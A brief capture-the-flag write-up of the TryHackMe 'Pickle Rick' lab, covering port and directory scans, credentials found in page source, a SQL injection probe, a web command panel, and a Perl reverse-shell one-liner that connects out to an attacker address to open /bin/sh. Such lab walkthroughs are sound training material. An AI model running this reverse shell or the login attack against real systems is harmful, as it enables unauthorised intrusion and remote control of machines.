# Notes for the TryHackMe Box "Pickle Rick"
# Writeup by k3rmit @github: ak3rmit


1. Found Username in the boxes web quellcode Username: R1ckRul3s

2. Nmap discovered an open 80 tcp web port for apache 2.4.12 and an open ssh port
   Tried to break in with 
   $ ssh R1ckRul3s@10.10.3.148
   Gets refused because I didn't have the RSA key

3. Gobuster scan bought 4 directorys
   
   /asstes
   /index.html
   /login.php seems interestin
   /robots.txt


4. Tried simple sql Injection but failed ('or1==1)

5. Found interesting String "Wubbalubbadubdub" try to use this as password

6. Since I have a username to work with I make a bruteforce attack using Hydra with the rockyou wordlist.
   Forget Hydra! "Wubbalubbadubdub" works as pw with R1ckRul3s username

7. We now come to an Page where we can execute commands an ls list following

	Sup3rS3cretPickl3Ingred.txt //looks very susipicious
	assets
	clue.txt
	denied.php
	index.html
	login.php
	portal.php
	robots.txt


8. $ cat Sup3rS3cretPickl3Ingred.txt doesn't work cause cat is disables

9. less command seems to work try it with that 
   $ less Sup3rS3cretPickl3Ingred.txt  returns our first flag yay

10. looking around the system
    $ cd ../.. && ls // it goes always to basic directory again that sucks try to reverse shell 


11. Try to use an perl reverse shell 
	perl -e 'use Socket;$i="attackerip";$p=1337;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

	DOES WORK YES were now fully control of the bash shell and can forget about that shitty interface 

12 last two flags are in the root directory and in the /home/rick directory

Easy but very  fun challenge.
